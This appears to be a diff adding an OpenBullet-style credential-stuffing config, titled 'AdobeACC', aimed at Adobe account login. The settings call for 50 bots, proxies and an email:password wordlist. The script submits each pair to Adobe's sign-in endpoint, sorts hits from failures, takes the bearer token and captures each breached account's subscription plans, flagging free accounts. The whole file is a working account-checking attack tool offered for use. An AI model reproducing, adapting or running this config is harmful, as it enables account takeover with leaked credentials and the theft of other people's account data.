@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "AdobeACC",
+  "SuggestedBots": 50,
+  "LastModified": "2018-08-07T19:46:16.6334845+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ane",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_STUFF REQUEST GET "https://ims-na1.adobelogin.com/ims/authorize/v1?response_type=token&client_id=SunbreakWebUI1&scope=AdobeID%2Copenid%2Csunbreak%2Cacct_mgmt_webui%2Cgnav%2Cadditional_info.account_type%2Csao.cce_private%2Ccreative_cloud%2Cread_countries_regions%2Cupdate_profile.password%2Cadditional_info.roles%2Cupdate_profile.optionalAgreements%2Cupdate_profile.change_password%2Cadditional_info.social%2Csocial.link%2Cunlink_social_account%2Cadmin_slo&locale=en_US&reauth=force&redirect_uri=https%3A%2F%2Faccounts.adobe.com%2Fen%23from_ims%3Dtrue%26old_hash%3D%26api%3Dauthorize%26reauth%3Dforce&jslibver=1.13.0" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_RELAY PARSE "<COOKIES(relay)>" LR "" "" Recursive=FALSE -> VAR "RELAY" "" "" 
+#PARSE_FTRSET PARSE "<COOKIES(ftrset)>" LR "" "" Recursive=FALSE -> VAR "FTRSET" "" "" 
+#PARSE_FG PARSE "<COOKIES(fg)>" LR "" "" Recursive=FALSE -> VAR "FG" "" "" 
+#PARSE_ESID PARSE "<SOURCE>" LR "name=\"esid\" value=\"" "\"" Recursive=FALSE -> VAR "ESID" "" "" 
+#POST_LOGIN REQUEST POST "https://adobeid-na1.services.adobe.com/renga-idprovider/pages/login.do" AutoRedirect=TRUE 
+  CONTENT "callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSunbreakWebUI1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Faccounts.adobe.com%252Fen%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dforce%26scope%3DAdobeID%252Copenid%252Csunbreak%252Cacct_mgmt_webui%252Cgnav%252Cadditional_info.account_type%252Csao.cce_private%252Ccreative_cloud%252Cread_countries_regions%252Cupdate_profile.password%252Cadditional_info.roles%252Cupdate_profile.optionalAgreements%252Cupdate_profile.change_password%252Cadditional_info.social%252Csocial.link%252Cunlink_social_account%252Cadmin_slo%252Creauthenticated&client_id=SunbreakWebUI1&denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2FSunbreakWebUI1%3Fredirect_uri%3Dhttps%253A%252F%252Faccounts.adobe.com%252Fen%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dforce%26response_type%3Dtoken&display=web_v2&flow=true&flow_type=token&idp_flow_type=login&locale=en_US&page_name=onLoad_SignInForm&reauthenticate=force&relay=<RELAY>&scope=AdobeID%2Copenid%2Csunbreak%2Cacct_mgmt_webui%2Cgnav%2Cadditional_info.account_type%2Csao.cce_private%2Ccreative_cloud%2Cread_countries_regions%2Cupdate_profile.password%2Cadditional_info.roles%2Cupdate_profile.optionalAgreements%2Cupdate_profile.change_password%2Cadditional_info.social%2Csocial.link%2Cunlink_social_account%2Cadmin_slo%2Creauthenticated&esid=<ESID>&username=<USER>&password=<PASS>&vi=&authSrc=AdobeID&is_reauthenticating=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://adobeid-na1.services.adobe.com/renga-idprovider/pages/login?callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2FSunbreakWebUI1%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Faccounts.adobe.com%252Fen%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dforce&client_id=SunbreakWebUI1&scope=AdobeID%2Copenid%2Csunbreak%2Cacct_mgmt_webui%2Cgnav%2Cadditional_info.account_type%2Csao.cce_private%2Ccreative_cloud%2Cread_countries_regions%2Cupdate_profile.password%2Cadditional_info.roles%2Cupdate_profile.optionalAgreements%2Cupdate_profile.change_password%2Cadditional_info.social%2Csocial.link%2Cunlink_social_account%2Cadmin_slo%2Creauthenticated&denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2FSunbreakWebUI1%3Fredirect_uri%3Dhttps%253A%252F%252Faccounts.adobe.com%252Fen%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%2526reauth%253Dforce%26response_type%3Dtoken&display=web_v2&relay=74065a82-3ce0-4e4e-a13b-d32865c40d47&locale=en_US&flow_type=token&idp_flow_type=login&reauthenticate=force" 
+  HEADER "Origin: https://adobeid-na1.services.adobe.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Please try again" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "ims_r" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "token%253D" "%2526token" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST GET "https://accounts.adobe.com/acctmgmt/plans?antiCache=1533670778013" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+#PARSE_INDIVIDUAL PARSE "<SOURCE>" JSON "individual" Recursive=FALSE -> CAP "INDIVIDUAL" "" "" 
+#PARSE_TEAMADMIN PARSE "<SOURCE>" JSON "teamAdmin" Recursive=FALSE -> CAP "TEAM ADMIN" "" "" 
+#PARSE_MISC PARSE "<SOURCE>" JSON "misc" Recursive=FALSE -> CAP "MISC" "" "" 
+#CHECK_FREE KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "{\"individual\":[],\"teamAdmin\":[],\"misc\":[\"CCM_FREE\"]}" 
